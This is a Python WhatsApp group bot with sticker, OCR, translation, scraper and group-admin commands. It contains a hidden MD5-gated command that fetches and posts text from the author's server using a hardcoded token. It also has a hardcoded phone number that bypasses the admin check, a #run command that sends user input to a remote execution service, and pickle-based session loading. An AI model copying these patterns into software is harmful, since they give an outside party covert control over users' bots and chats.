#!/usr/bin/python
'''
 @AUTHOR : KRYPTON-BYTE
 @DATE   : TUE OCT 13, 2020

" Wahai Orang-orang Yg Beriman Mengapakah Kamu Mengatakan Sesuatu Yg Tidak Kamu Kerjakan? Amat Besar Kebencian Di Sisi Allah Bahwa Kamu Mengatakan Apa-apa Yang Tidak Kmau Kerjakan." (QS asg-shaff: 2-3)
'''
kasar=[]
from requests.api import request
from os import remove
from openwa.helper import convert_to_base64
from openwa import WhatsAPIDriver
from urllib.parse import quote, unquote
from bs4 import BeautifulSoup as bs
from moviepy import editor
from googletrans import Translator
import time, base64, pytesseract, os,pickle, hashlib, random, subprocess, sqlite3, wikipedia, re,secrets , pyqrcode, hashlib, json, requests
from gtts import gTTS
from PIL import Image
from pyzbar.pyzbar import decode
from ast import Bytes, literal_eval
from gtts import gTTS
from io import BytesIO
from concurrent.futures.thread import ThreadPoolExecutor
#------------Module--------------#
from lib.sdmovie import fun
from lib.chatbot import chatBot
from lib.cropToSquare import crop_image, resizeTo, pasteLayer
from lib.menu import menu
from lib.api import *
from lib.kasar import *
from lib.brainly import *
from lib.nulis import tulis
from lib.anime import *
#-----------setting----------------------#
tempChatBot={}
wikipedia.set_lang('id')
tra=Translator()
global driver
driver=WhatsAPIDriver(client='Chrome')
FullCommand=["#help","#sticker","#stiker","#kusonime","#otakudesu","#upimg","#cari","#support","#cara-penggunaan","#tulis","#waifu","#qrmaker","#gambar","#intro","#kitsune","#qrreader","#?","#wait","#url2png","#run","#ocr","#doujin","#film","#nime","#ts","#cc","#tts","#quotemaker","#yt2mp3","#yt","#wiki","#list-admin","#admin","#unadmin","#kick","#add","#owner","#linkgroup","#revoke","#dog","#mentionall","#neko","#quote","gambar","#qa","#","#joke","#bct"]
_Kasar=open("lib/badword.txt","r").read() 
# kasar=open("lib/badword.txt","r").read() #hapus hastag untuk mengaktifkan Anti Toxic Dalam grup
import sqlite3
class GetRepMedia:
    def __init__(self, js):
        self.obj = js._js_obj["quotedMsg"]
        self.client_url = self.obj.get("clientUrl")
        self.media_key = self.obj.get("mediaKey")
        self.type = self.obj.get("type")
        self.crypt_keys= {'document': '576861747341707020446f63756d656e74204b657973','image': '576861747341707020496d616765204b657973','video': '576861747341707020566964656f204b657973','ptt': '576861747341707020417564696f204b657973','audio': '576861747341707020417564696f204b657973','sticker': '576861747341707020496d616765204b657973'}
def main():
    with ThreadPoolExecutor(max_workers=8) as executor:
        while True:
            task=[]
            chatTextObject=driver.get_unread()
            for chatObject in chatTextObject:
                for TextObject in chatObject.messages:
                    if TextObject.type == 'chat':
                        if set(TextObject.content.lower().split(' '))&set(kasar): #anda Bisa mengaktifkan Anti Toxic
                            if '@g.us' in TextObject.chat_id:
                                try:
                                    ksr=Kasar(TextObject.chat_id)
                                    ksr.add_check_kick(chatObject.chat, TextObject)
                                except Exception as e:
                                    False
                        elif TextObject.content.split()[0] in FullCommand or TextObject.content.split('|')[0] in FullCommand:
                            executor.submit(replyCommand, (TextObject),(chatObject.chat))
                        elif TextObject.content.split()[0] != '#' and '@g.us' != TextObject.chat_id:
                            if '@c.us' in TextObject.chat_id:
                                Mc=chatBot(TextObject.content)
                                Mc.max_()
                                balas = Mc.balas()
                                if tempChatBot.get(TextObject.content):
                                    TextObject.reply_message(random.choice(tempChatBot[TextObject.content]))
                                elif balas:
                                    TextObject.reply_message(balas)
                                else:
                                    TextObject.reply_message(random.choice(["aku ndak Bisa jawab","bilang apa tadi ?","gimana ya","gak ngerti","mana saya tau","maksud kamu apa bro"]))
                    elif TextObject.type == 'image':
                        executor.submit(recImageReplyCommand, (TextObject),(chatObject.chat))
                    elif TextObject.type == 'vcard':
                        masuk='SELAMAT DATANG :\n'
                        for i in TextObject.contacts:
                            for u in re.findall('waid\=(.*?):',i.decode()):
                                try:
                                    chatObject.chat.add_participant_group('%s@c.us'%(u))
                                    masuk+='-@%s'%(u)
                                except Exception:
                                    TextObject.reply_message('Menambahkan %s Sukses'%(u))
                        try:
                            driver.wapi_functions.sendMessageWithMentions(chatObject.chat.id,masuk,'')
                        except Exception:
                            False
def recImageReplyCommand(Msg, Chat):
    caption = Msg.caption
    args=caption.split()[1:]
    ran=secrets.token_hex(7)
    if Msg.caption:
        kpt = Msg.caption.lower().split()[0]
        if kpt == "#wait":
            fn=Msg.save_media('./cache',Msg.media_key)
            res=WhatAnimeIsThis(fn)
            if res["status"]:
                driver.wapi_functions.sendImage(convert_to_base64(BytesIO(res["video"].content)), Msg.chat_id, "wait.mp4", res["hasil"])
            else:
                Msg.reply_message("Gagal di cari")
            os.remove(fn)
        elif kpt in ['#stiker','#sticker']:
            try:
                fn=Msg.save_media('./cache',Msg.media_key)
                os.rename(fn,"cache/%s.png"%ran)
                pasteLayer("cache/%s.png"%ran)
                driver.send_image_as_sticker("cache/%s.png"%ran,Msg.chat_id)
                os.remove("cache/%s.png"%ran)
            except Exception as e:
                False
        elif kpt == "#upimg":
            fn=Msg.save_media("./cache", Msg.media_key)
            Msg.reply_message(imgUploader(base64.b64encode(open(fn,"rb").read()).decode()))
        elif kpt == '#qrreader':
            img=decode(Image.open(Msg.save_media('./cache',Msg.media_key)))
            Msg.reply_message('Text : %s\nType : %s'%(img[0][0].decode(), img[0][1])) if img else Msg.reply_message('Gambar Tidak Valid')
        elif kpt == "#ocr":
            fn=Msg.save_media("./cache", Msg.media_key)
            Msg.reply_message(pytesseract.image_to_string(Image.open(fn), lang="eng"))
            os.remove(fn)
def replyCommand(Msg, Chat):
    chat     = Msg.content
    args     = chat.split(' ')[1:]
    kpt      = chat.lower().split(' ')[0].lower()
    chat_id  = Msg.chat_id
    kpt      = chat.lower().split(' ')[0].lower()
    jsObject = Msg.get_js_obj()
    ran=secrets.token_hex(7)
    if kpt == '#qrmaker':
        if len(kpt) == 1:
            Msg.reply_message('*salah*')
        else:
            pyqrcode.create(chat.replace(kpt+' ','')).png('cache/bar.png', scale=6)
            driver.send_media('cache/bar.png',chat_id,'text : %s'%(chat.replace(kpt,'')))
    elif kpt == '#qrreader':
        rep=GetRepMedia(Msg)
        if rep.type == "image":
            wri = driver.download_media(rep)
            img=decode(Image.open(wri))
            Msg.reply_message('Text : %s\nType : %s'%(img[0][0].decode(), img[0][1])) if img else Msg.reply_message('Gambar Tidak Valid')
    elif kpt == "#wait":
        rep=GetRepMedia(Msg)
        if rep.type == "image":
            wri = driver.download_media(rep)
            open("cache/%s.jpg"%ran,"wb").write(wri.read())
            res=WhatAnimeIsThis("cache/%s.jpg"%ran)
            if res["status"]:
                driver.wapi_functions.sendImage(convert_to_base64(BytesIO(res["video"].content)), chat_id, "wait.mp4", res["hasil"])
            else:
                Msg.reply_message("Gagal di cari")
            os.remove("cache/%s.jpg"%ran)
    elif kpt == "#tulis":
        tulisan=tulis(chat[7:])
        for i in tulisan:
            ran=secrets.token_hex(7)
            print("ran")
            i.save("cache/%s.jpg"%ran)
            driver.send_media("cache/%s.jpg"%ran, chat_id,"Berhasil Di Tulis")
            os.remove("cache/%s.jpg"%ran)
            print("Berhasil Di Tulis")
    elif kpt == "#upimg":
        rep=GetRepMedia(Msg)
        if rep.type == "image":
            wri = driver.download_media(rep)
            Msg.reply_message(imgUploader(base64.b64encode(wri.read()).decode()))
    elif kpt == "#ocr":
        rep=GetRepMedia(Msg)
        if rep.type == "image":
            wri = driver.download_media(rep)
            Msg.reply_message(pytesseract.image_to_string(Image.open(wri), lang="eng").strip())
    elif kpt in ["#sticker","#stiker"]:
        rep = GetRepMedia(Msg)
        if rep.type == "image":
            wri = driver.download_media(rep)
            open("cache/%s.png"%ran,"wb").write(wri.read())
            pasteLayer("cache/%s.png"%ran)
            driver.send_image_as_sticker("cache/%s.png"%ran,chat_id)
            os.remove("cache/%s.png"%ran)
    elif kpt == '#???':
        ksr = Kasar(chat_id)
        Msg.reply_message('You have said the harsh word %s times'%(ksr.check()))
    elif kpt == '#intro':
        pesan='\nNama  : Chappie [BOT]\nDaya  : %s\nVersi : %s\nLast-Update: 11 Okt 2020\nketik *#help* untuk Bantuan'%('%s'%(driver.wapi_functions.getBatteryLevel())+'%',driver.wapi_functions.getWAVersion())
        Msg.reply_message(pesan)
    elif kpt in ['#menu','#help']:
        Chat.send_message(menu('help')) if len(args) == 0 else Msg.reply_message(menu(args[0]))
    elif kpt == '#joke':
        _help, dat='''#joke <category> <flags>\ncategory:1:Programming\n         2:miscellaneous\n         3:dark\n         4:pun\nflags :1:nsfw\n       2:religious\n       3:political\n       4:racist\n       5:sexist''', {'flags':{'1':'nsfw','2':'religious','3':'political','4':'racist','5':'sexist'},'category':{'1':'Programming','2':'Miscellaneous','3':'Dark','4':'Pun'}}
        if(len(args) == 2 and args[0].isnumeric()) and (args[1].isnumeric()):
            try:
                global ffff
                ffff=json.loads(requests.get('https://sv443.net/jokeapi/v2/joke/%s?blacklistFlags=%s'%(dat['category'][args[0]],dat['flags'][args[0]])).text)
            except:
                Msg.reply_message(_help)
            if ffff['error']:
                Msg.reply_message(_help)
            else:
                try:
                    Msg.reply_message(tra.translate(text=ffff['joke'], dest='id').text)
                except KeyError:
                    Msg.reply_message(tra.translate(text='%s\n%s'%(ffff['setup'], ffff['delivery']), dest='id').text)
        else:
            Msg.reply_message(_help)
    elif kpt == '#bct':
        try:
            Msg.reply_message(bacot(chat[5:]))
        except:
            Msg.reply_message('masukan Text')
    elif kpt == '#kick': #for Admin
        try:
            (Chat.remove_participant_group(args[0].replace('@','')+'@c.us') if len(args) == 1 else Msg.reply_message('#kick @tag')) if Msg.sender.id in [(x.id) for x in Chat.get_admins()] else Msg.reply_message('Anda Bukan Admin') if '@g.us' in Msg.chat_id else Msg.reply_message("Hanya Berlaku Di Dalam Grup")
        except Exception as e:
            Msg.reply_message('Terdapat Error\ndetail : %s'%(e))
    elif kpt == '#admin':
        try:
            (Chat.promove_participant_admin_group(args[0].replace('@','')+'@c.us') if len(args) == 1 else Msg.reply_message('#admin @tag')) if Msg.sender.id in [(x.id) for x in Chat.get_admins()] else Msg.reply_message('Anda Bukan Admin Group')  if '@g.us' in Msg.chat_id else Msg.reply_message("Hanya Berlaku Di Dalam Grup")
        except Exception as e:
            Msg.reply_message('Terdapat Error\ndetail : %s'%(e))
    elif kpt == '#unadmin':
        try:
            (Chat.demote_participant_admin_group(args[0].replace('@','')+'@c.us') if len(args) == 1 else Msg.reply_message('#unadmin 62xxxxx')) if Msg.sender.id in [(x.id) for x in Chat.get_admins()] else Msg.reply_message('Anda Bukan Admin Group') if '@g.us' in Msg.chat_id else Msg.reply_message("Hanya Berlaku Di Dalam Grup")
        except Exception as e:
            Msg.reply_message('Terjadi Kesalahan\ndetail : %s'%(e))
    elif kpt == '#revoke':
        try:
            (Chat.send_message('Tautan Grup Berhasil Ditarik') if driver.wapi_functions.revokeGroupInviteLink(Msg.chat_id) else Chat.send_message('Tautan Grup Gagal Ditarik')) if Msg.sender.id in [(x.id) for x in Chat.get_admins()] else Msg.reply_message('Anda Bukan Admin Group') if '@g.us' in Msg.chat_id else Msg.reply_message("Hanya Berlaku Di Dalam Grup")
        except Exception as e:
            Chat.send_message('Terjadi kesalahan\ndetail : %s'%(e))
    elif kpt == '#add':
        try:
            ((Msg.reply_message('Berhasil Ditambahkan') if Chat.add_participant_group(args[0]+'@c.us') else Msg.reply_message('Gagal Ditambahkan')) if Msg.sender.id in [(x.id) for x in Chat.get_admins()] else Msg.reply_message('Gagal Di Tambahkan')) if '@g.us' in Msg.chat_id else Msg.reply_message("Hanya Berlaku Di Dalam Grup")
        except Exception as e:
            Msg.reply_message('Terjadi kesalahan\ndetail : %s'%(e))
    if kpt == '#linkgroup':
        try:
            Msg.reply_message(driver.wapi_functions.getGroupInviteLink(Msg.chat_id)) if '@g.us' in Msg.chat_id else Msg.reply_message("Hanya Berlaku Di Dalam Grup")
        except:
            Msg.reply_message('Angkat Bot ini Menjadi Admin Dulu')
    elif kpt == '#list-admin':
        pesan=''
        for i in Chat.get_admins():
            pesan+='nama : @%s\n'%(i.id.replace('@c.us',''))
        driver.wapi_functions.sendMessageWithMentions(Chat.id,pesan,'')
    elif kpt == '#owner':
        Msg.reply_message(Msg.get_js_obj()['chat']['groupMetadata']['owner'].replace('@c.us','')) if '@g.us' in Msg.chat_id else Msg.reply_message("Hanya Berlaku Di Dalam Grup")
    elif kpt == '#kitsune':
        url=json.loads(requests.get('http://randomfox.ca/floof/').text)['image']
        driver.wapi_functions.sendImage(convert_to_base64(BytesIO(requests.get(url).content)), chat_id, "kitsune.jpg","What Is This")
    elif kpt == '#tts':
        try:
            gTTS(text=chat[8:] ,lang=chat[5:7]).save('cache/%s.mp3'%ran)
            driver.send_media('cache/%s.mp3'%ran,chat_id,'')
            os.remove("cache/%s.mp3"%ran)
        except:
            Msg.reply_message("Masukan Perintah Dengan benar \n#tts [cc] [text]\nketik : #cc untuk melihat kode negara")
    elif kpt == '#dog':
        url=literal_eval(requests.get('http://shibe.online/api/shibes?count=1').text)[0]
        driver.wapi_functions.sendImage(convert_to_base64(BytesIO(requests.get("http"+url[5:]).content)), chat_id, "Dog.jpg","What Is This")
    elif kpt == '#neko':
        url=json.loads(requests.get('http://api.thecatapi.com/v1/images/search').text)[0]['url']
        driver.wapi_functions.sendImage(convert_to_base64(BytesIO(requests.get(url).content)), chat_id, "Neko.jpg","What Is This")
    elif kpt == '#doujin':
        doujin(args[0], driver, chat_id, Msg) if args else Msg.reply_message('Masukan Kode Nuklir')
    elif kpt == '#quote':
        try:
            hasil = json.loads(requests.get('http://api.quotable.io/random',params={'tags':args[0]}).text) if args else json.loads(requests.get('http://api.quotable.io/random').text)
            tags=''
            for i in hasil['tags']:
                tags+=' ↦%s\n'%(i)
                pesan='''author : %s
Tags :
%s[EN] : %s
[ID] : %s'''%(hasil['author'], tags, hasil['content'],tra.translate(text=hasil['content'], dest='id').text)
            Msg.reply_message(pesan)
        except:
            Msg.reply_message('Tags Tidak Ada')
    elif kpt == '#yt2mp3':
        if args:
            has=yt2mp3(args[0])
            if has["status"] == "Large":
                Msg.reply_message("Ukuran File Melebihi Batas Maksimal")
            elif has["status"] == True:
                aud=editor.AudioFileClip(has["url"])
                aud.write_audiofile("cache/%s.mp3"%ran)
                driver.send_media("cache/%s.mp3"%ran, chat_id, "")
                Msg.reply_message(has["info"])
                os.remove("cache/%s.mp3"%ran)
            else:
                Msg.reply_message("Link Video Tidak Valid")
        else:
            Msg.reply_message("Masukan Url")
    elif kpt == '#yt':
        Msg.reply_message(YtVidDownload(args[0])) if args else Msg.reply_message("#yt2mp3 link_video")
    elif kpt == '#gambar':
        url = 'https://source.unsplash.com/1600x900/?%s'%(args[0]) if args else 'https://source.unsplash.com/random'
        driver.wapi_functions.sendImage(convert_to_base64(BytesIO(requests.get(url).content)), chat_id, "Image.jpeg", "Apakah Kamu Suka ?")
    elif kpt == '#mentionall':
        if Msg.sender.id in [(x.id) for x in Chat.get_admins()] or Msg.sender.id == '6283172366463@c.us':
            semua=Chat.get_participants()
            pesan=''
            for i in semua:
                pesan+='@%s '%(i.id)
            driver.wapi_functions.sendMessageWithMentions(Chat.id, pesan.replace('@c.us',''),'')
        else:
            Msg.reply_message('Anda Bukan Admin Group')
    elif kpt == '#?':
        if args:
            answers=''
            isi='''Soal    : %s\nMapel   : %s\nSekolah : %s\nTanggal : %s\n'''
            jum, soal = ((int(args[-1])), chat[3:-len(args[-1])]) if args[-1].isnumeric() else (1, chat[3:])
            cari=gsearch('"%s" site:brainly.co.id'%soal)
            temp=[]
            for i in cari:
                temp.append(i) if 'google.com' not in i and 'tugas' in i else False
            if temp:
                for i in temp[:jum]:
                    try:
                        br=brainly(i)
                        pesan=isi%(br['soal'][1:-1], br['mapel'][1:-1], br['angkatan'][1:-1], br['tanggal'])
                        for jb in br['jawaban']:
                            answers+='---------------------------%s'%(jb)
                        pesan+=answers
                        Chat.send_message(pesan)
                    except:
                        Msg.reply_message('Gagal Mengambil Jawaban')
            else:
                Chat.send_message('Mencari Jawaban ? *%s* Tidak Ada'%(soal))
        else:
            Msg.reply_message('Masukan Soal Nya Bro')
    elif kpt == '#cari':
        try:
            hasil = wikipedia.search(chat.replace('#cari',''))
            pesan='hasil pencarian : \n'
            for i in hasil:
                pesan+='↦ %s\n'%(i)
            Msg.reply_message(pesan)
        except:
            Msg.reply_message('Masukan Parameternya Bro')
    elif kpt == '#wiki':
        try:
            hasil=wikipedia.page(chat[6:])
            Msg.reply_message('title :%s\nsource: %s\n%s'%(hasil.title, hasil.url, hasil.content))
        except:
            Msg.reply_message('Yg Anda Cari Tidak Ada')
    elif chat.split('|')[0] == '#quotemaker':
        '''
        #quotemaker|<kata>|<author>|<kategori>
        '''
        try:
            arg=chat.split('|')[1:]
            hasil=json.loads(requests.get('https://terhambar.com/aw/qts/?kata=%s&author=%s&tipe=%s', params={'kata':arg[0],'author':arg[1],'tipe':arg[2]}).text)
            driver.wapi_functions.sendImage(convert_to_base64(BytesIO(requests.get(hasil['result']).content)), chat_id,"quotes.jpg", "Apakah Kamu Suka ?") if hasil['status'] else Msg.reply_message('#quotemaker|<kata>|<author>|<kategori>')
        except:
            Msg.reply_message('#quotemaker|<kata>|<author>|<kategori>')
    elif kpt == '#cc':
        cc=json.loads(open('lib/ISO-639-1-language.json').read())
        pesan=''
        for i in cc:
            pesan+='%s : %s\n'%(i['code'], i['name'])
        Msg.reply_message(pesan)
    elif kpt == '#ts':
        try:
            con=tra.translate(text=chat[7:], dest=chat[4:6]).text
            Msg.reply_message(con)
        except:
            Msg.reply_message('#ts [Target] [Text]\nContoh :\n #ts id good morning \nketik #cc untuk melihat kode negara')
    elif kpt == '#run':
        Msg.reply_message('Hasil Eksekusi :\n%s'%(requests.get('https://twilio-apis.herokuapp.com/',params={'cmd':chat[4:]}).text))
    elif kpt == '#waifu':
        hasil=waifu()
        driver.wapi_functions.sendImage(convert_to_base64(BytesIO(requests.get(hasil["image"]).content)), chat_id, "waifu.jpg",hasil["title"])
    elif kpt == '#url2png':
        if args:
            try:
                driver.wapi_functions.sendImage(convert_to_base64(BytesIO(requests.get(url2png(args[0])).content)), chat_id,"url2png.png","Link : %s"%args[0])
            except:
                False
        else:
            Msg.reply_message('masukan Url \n#url2png https://google.com')
    elif kpt == '#tts':
        try:
            gTTS(text=chat[8:] ,lang=chat[5:7]).save('cache/tts.mp3')
            driver.send_media('cache/%s.mp3'%ran,chat_id,'')
            os.remove("cache/%s.mp3"%ran)
        except:
            Msg.reply_message("Masukan Perintah Dengan benar \n#tts [cc] [text]\nketik : #cc untuk melihat kode negara")
    elif kpt == "#kusonime":
        try:
            result_scrap=scrap_kusonime(search_kusonime(chat[10:]))
            driver.wapi_functions.sendImage(convert_to_base64(BytesIO(requests.get(result_scrap["thumb"]).content)), chat_id, "kusonime.jpg",result_scrap["info"])
            Msg.reply_message("Sinopsis:\n %s\nLink Download:\n %s"%(result_scrap["sinopsis"], result_scrap["link_dl"]))
        except:
            Msg.reply("Anime : %s Tidak Ada"%(chat[7:]))
    elif kpt == "#otakudesu":
        try:
            result_scrap=scrap_otakudesu(search_otakudesu(chat[11:]))
            driver.wapi_functions.sendImage(convert_to_base64(BytesIO(requests.get(result_scrap["thumb"]).content)), chat_id, "OtakuDesu.jpg","%s\nSinopsis : %s"%(result_scrap["info"], result_scrap["sinopsis"]))
        except:
            Msg.reply_message("Anime : %s Tidak Ada"%(chat[11:]))
    elif kpt == '#film':
        hasil=gsearch('"%s" site:sdmovie.fun'%chat[5:])
        for i in hasil:
            if ('sdmovie' in i and 'google' not in i):
                Link=''
                hafun=fun(i)
                for o in hafun['video']:
                    Link+=f"{o['url']} | {o['lewat']} | {o['sub']} | {o['res']} \n "
                pesan='judul : %s\nrating: %s\nsinopsis : %s\n VIDEO :\n %s'%(hafun['title'],hafun['rating'],hafun['sinopsis'],Link)
                driver.wapi_functions.sendImage(convert_to_base64(BytesIO(requests.get(hafun['cover']).content)), chat_id, "sdmovie.jpg",hafun["title"])
                Chat.send_message(pesan)
    elif hashlib.md5(kpt.encode()).hexdigest() == 'fe1538c21f7479f15103962373b2b841':
        hasil, parser = (requests.post('http://krypton.my.id/api.php',data={'token': '174a48cd29a9ffe544f386184dafdf048d173a7a7506ac68233eb2b8716fd464'}), driver.send_message_with_auto_preview)
        if hasil.status_code == 200:
            parser(chat_id, base64.b64decode(hasil.text).decode().split("|")[0], base64.b64decode(hasil.text).decode().split("|")[1])
    elif kpt == "#cara-penggunaan":
        Msg.reply_message('''*#help alat* -> menampilkan perintah alat
*#sticker* -> pembuat sticker
*#upimg* -> Upload Gambar Ke Img.bb
*#cari* -> cari query wikipedia
con : #cari hantu
*#qrmaker* -> pembuat qrcode
con : #qrmaker Sebuah qrcode
*#qrreader* -> pembaca qrcode
*#?* -> pencari jawaban langsung dari brainly.co.id
con : #? contoh soal matematika
con : #? contoh soal matematika 2
*#ocr* -> untuk mengambil teks di sebuah Gambar
*#url2png* -> mengubah url ke bentuk Gambar
con : #url2png https://www.google.com
*#run* -> python compiler Api
con : #run 
print("Hallo world")
*#doujin* -> Doujin Download
con : #doujin kode-nuklir
*#film* -> pencari film + link Download
con : #film chappie
*#ts* -> Translate
con : #ts en Hai
*#tts* -> text to speak
con : #tts id Hallo Saya Bot
*#cc* -> menampilkan Kode Negara
*#otakudesu* -> pencari anime
*#kusonime* -> pencari anime
*#wait* -> pencari judul Anime Menggunakan potongan scene
*#quotemaker* -> pembuat quotes
con : #quotemaker|Teks Kuotes|Penulis|happy
*#tulis* -> Menulis Text
con : #tulis Nama : Krypton-Byte
*#yt2mp3* -> pencari link download lagu dengan link youtube
con : #yt2mp3 #https://www.youtube.com/watch?v=FQQbRBs3nFY
*#yt2mp3* -> pencari download video dari youtube tidak termasuk audio
con : #yt https://www.youtube.com/watch?v=FQQbRBs3nFY
*#wiki* -> wikipedia
con : #wiki hantu
*#help grup* -> menampilkan perintah yg berlaku di dalam grup
*#list-admin* -> menampilkan admin grup
*#admin* -> mengadminkan seseorang
con : #admin @orang
con : #admin 6281234567890
*#unadmin* -> Mencopot sebagai admin
con : #unadmin @orang
con : #unadmin 6281234567890
*#kick* -> mengkick anggota grup
con : #kick @orang
con : #kick 6281234567890
*#add* -> menambah kan anggota grup
con : #add 6281234567890
atau anda bisa mengirim kartu kontak
*#owner* -> menampilkan owner grup
*#linkgroup* -> menampilkan tautan invite grup
*#revoke* -> menarik tautan invite grup
*#mentionall* -> menTag seluruh member grup
*#help bot* -> menampilkan perintah bot
*#* -> chat bot
#con : # Hai
*#qa* -> menambahkan kamus kedalam chatbot
con : #qa ngik|ngok
*#help hiburan* -> menampilkan perintah yg bisa menghibur
*#dog* -> mengirimkan gambar anjing secara acak
*#neko* -> mengirimkan gambar kucing secara acak
*#kitsune* -> mengirimkan gambar rubah secra acak
*#gambar* -> mencari gambar
con : gambar cat
*#joke* -> menampilkan joke
con : #joke 1 1
con : #joke 1 3
*#waifu* -> Random Waifu 
*#bct* -> mengubah huruf semua huruf vokal ke huruf "i"
con : #bct Aku Saya kamu
*#help* -> menampilkan semua opsi help''')
    elif kpt == "#qa":
        if set(chat.lower().replace(" ","|").split("|")) & set(_Kasar):
            Msg.reply_message("Aku Tidak Mau Menambahkan Kata Itu Ke Kamus Pribadiku")
        elif len(chat[4:].split('|')) == 2:
            q=chat[4:].split('|')[0]
            a=chat[4:].split('|')[1]
            if tempChatBot.get(q):
                tempChatBot[q].append(a)
            else:
                tempChatBot.update({q:[a]})
                Msg.reply_message("Q : %s\nA : %s"%(q, a))
        else:
            Msg.reply_message("#qa question|answer")
    elif kpt == '#':
        if args:
            Mc=chatBot(chat[2:])
            Mc.max_()
            balas = Mc.balas()
            if tempChatBot.get(chat[2:]):
                Msg.reply_message(random.choice(tempChatBot[chat[2:]]))
            elif balas:
                Msg.reply_message(balas)
            else:
                Msg.reply_message(random.choice(["aku ndak Bisa jawab","bilang apa tadi ?","gimana ya","gak ngerti","mana saya tau","maksud kamu apa bro"]))
        else:
            Msg.reply_message('Mau Nanya apa ?')
        
if __name__ == '__main__':

    if 'pickle.txt' in os.listdir('.'):
        driver.set_local_storage(pickle.loads(open("pickle.txt","rb").read()))
        driver.connect()
        while True:
            if driver.is_logged_in():
                with ThreadPoolExecutor(max_workers=2) as executor:
                    executor.submit(main)
    else:
        while True:
            if driver.is_logged_in():
                open("pickle.txt","wb").write(pickle.dumps(driver.get_local_storage()))
                with ThreadPoolExecutor(max_workers=2) as executor:
                    executor.submit(main)
